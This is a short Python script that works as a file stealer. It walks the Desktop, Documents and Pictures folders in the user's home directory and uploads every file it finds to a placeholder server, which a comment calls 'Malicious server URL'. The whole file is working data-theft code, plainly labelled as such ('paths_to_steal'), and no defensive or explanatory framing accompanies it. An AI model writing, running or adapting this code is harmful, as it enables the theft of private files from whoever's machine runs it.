import os
import requests

def send_files(file_path):
    url = 'https://<YOUR_URL>/file' # Malicious server URL
    files = {'file': open(file_path, 'rb')}
    response = requests.post(url, files=files)
    print(f"Response : {response.text}")

def main():
    paths_to_steal = [   
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Documents'),
        os.path.expanduser('~/Pictures')
    ]

    for path in paths_to_steal:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    send_files(file_path)

if __name__ == "__main__":
    main()